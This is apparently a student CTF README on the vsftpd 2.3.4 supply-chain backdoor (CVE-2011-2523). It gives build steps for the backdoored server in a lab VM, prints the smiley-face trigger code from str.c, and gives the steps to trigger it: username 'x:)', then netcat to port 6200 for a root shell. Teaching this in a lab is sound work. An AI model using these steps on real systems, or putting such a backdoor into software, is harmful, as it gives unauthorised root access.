# Smiley Face CTF — Root@UT

## Background

In 2011, the vsftpd 2.3.4 source code hosted on the official download 
server was secretly replaced with a backdoored version. 
This is a classic example of a **supply chain attack** —
rather than exploiting the software itself, the attacker compromised 
the distribution channel.

The backdoor was incredibly simple: 
if a user logged in with a username containing `:)`, 
the server would open a bind shell on **port 6200**, giving the attacker 
root access. The malicious code was only a few lines inserted into `str.c`:
```c
if(p_str->p_buf[i] == 0x3a && p_str->p_buf[i+1] == 0x29)
{
    vsf_sysutil_bindlisten_ipv4addr(6200);
}
```

`0x3a` = `:` and `0x29` = `)` in ASCII — the smiley face.

This vulnerability is tracked as **CVE-2011-2523** and is one of the 
most well-known examples of a backdoored open source package, 
predating modern supply chain attacks like SolarWinds (2020) and the XZ 
Utils backdoor (2024).
Special thanks to [This GitHub Repository](https://github.com/DoctorKisow/vsftpd-2.3.4)
I found that preserved the exploit.

---

## Set up the CTF

### Prerequisites
- Kali Linux or any offensive machine
- A target UNIX-Like VM running the backdoored vsftpd 2.3.4
- Note check out the GitHub repository linked about, in the README.md there's 
- great documentation and steps with how to get this installed

1. you need to install these two build requirements:
```shell
 apt-get install build-essential
 apt-get install libpam0g-dev
```

2. You want to download the source files for the FTP server and go into that directory. I personally went
into my Downloads folder to clone this repo:
```shell
cd Downloads # Optional Step, do this anywhere
git clone https://github.com/DoctorKisow/vsftpd-2.3.4.git
cd vsftpd-2.3.4
```

3. there's a "Makefile" that contains all the build instructions, we're gonna have to edit this so it works
on a modern VM, this might be different if you're using a different Linux distro
```shell
nano Makefile
```
- Inside this MakeFile, you're going to have to edit the variable "LIBS" to add "-lpam" so 
it looks at the Pluggable Authentication Modules Library, it should look like this after:
```shell
LIBS = './vsf_findlibs.sh' -lcrypt -lpam
```
- Outside of Nano text editor you might get an error after making so if this is the case run this:
```shell
chmod +x vsf_findlibs.sh
```

4. You need to run these commands to create directories, usergroups, group ID's for
the anonymous FTP users, and an anonymous FTP home directory since the FTP server expects this
all when it's compiled
```shell
sudo install -v -d -m 0755 /var/ftp/empty
sudo install -v -d -m 0755 /home/ftp
sudo groupadd -g 47 vsftpd
sudo groupadd -g 48 ftp
sudo useradd -c "vsftpd User" -d /dev/null -g vsftpd -s /bin/false -u 47 vsftpd
sudo useradd -c anonymous_user -d /home/ftp -g ftp -s /bin/false -u 48 FTP
```

5. Usually you would run "make" and it would compile but there's an error in the 
code itself so the FTP server won't compile so lets look at the error and  str.c file:
```
str.c: In function ‘str_contains_space’:
str.c:575:7: error: implicit declaration of function ‘vsf_sysutil_extra’; did you mean ‘vsf_sysutil_exit’? [-Wimplicit-function-declaration]
  575 |       vsf_sysutil_extra();
      |       ^~~~~~~~~~~~~~~~~
      |       vsf_sysutil_exit
make: *** [Makefile:21: str.o] Error 1
```
```shell
nano str.c
```
- okay we're in this file all the way at the top  we're gonna add one line of code lets look:
```shell
/* Anti-lamer measures deployed, sir! */
#define PRIVATE_HANDS_OFF_p_buf p_buf
#define PRIVATE_HANDS_OFF_len len
#define PRIVATE_HANDS_OFF_alloc_bytes alloc_bytes
#include "str.h"

/* Ick. Its for die() */
#include "utility.h"
#include "sysutil.h"
void vsf_sysutil_extra();  /* ADD THIS LINE RIGHT HERE THIS IS THE ONLY THING ADDED */

/* File local functions */
```

6. Now you can compile your code so you'll just run in the directory "make" and it should compile,
put any errors into an AI to fix, the last step we need to follow this stuff from the
GitHub README.md that modified the config and installs 
```shell
sudo install -v -m 755 vsftpd /usr/sbin/vsftpd
sudo install -v -m 644 vsftpd.8 /usr/share/man/man8
sudo install -v -m 644 vsftpd.conf.5 /usr/share/man/man5
sudo install -v -m 644 vsftpd.conf /etc
```

---


## run the exploit
#### These four steps were copied directly from Dr. Kisow's README.md included above
- On one node run vsftpd
- On another node connected to the network login to the server by using: ftp <server address>
- Once connected use the username 'x:)' with any password.
- Once the terminal hangs open another terminal and use nc <server address> 6200 and you're in

---

## Set up the CTF (Python)
- Note whoever the FTP server is running on will have to run "sudo vsftpd /etc/vsftpd.conf"
- to stop the FTP server: "sudo pkill vsftpd"
- to close port 6200: "sudo systemctl stop 6200" or find the PID of that and do sudo kill <PID>
- check testFTP.py for my Python file with comments explaining the code, ExploitFTP.py will be made during the meeting

---

## What is the exploit?
1. First sign of tampering was this code was found from 'str.c' and you can tell in the else if condition if the username
contains 0x3a and 0x29 (which is hex for ':' and ')' then call the function "vsf_sysutil_extra()"
```c
int str_contains_space(const struct mystr* p_str)
{
  unsigned int i;
  for (i=0; i < p_str->len; i++)
  {
    if (vsf_sysutil_isspace(p_str->p_buf[i]))
    {
      return 1;
    }
    else if((p_str->p_buf[i]==0x3a)
    && (p_str->p_buf[i+1]==0x29))
    {
      vsf_sysutil_extra();
    }
  }
  return 0;
}

```

